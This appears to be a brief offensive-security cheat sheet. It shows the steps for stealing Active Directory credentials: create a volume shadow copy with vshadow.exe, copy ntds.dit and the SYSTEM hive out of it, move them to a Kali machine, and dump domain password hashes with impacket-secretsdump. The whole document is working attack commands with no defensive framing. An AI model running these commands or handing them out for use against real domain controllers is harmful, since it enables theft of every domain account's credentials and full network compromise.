# Vshadow
[vshadow.exe](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample)
```powershell
vshadow.exe -nw -p C:
# Get Path like:  \GLOBALROOT\Device\HarddiskVolumeShadowCopy2

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```
Transfer to Local Kali AND Extract it.
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```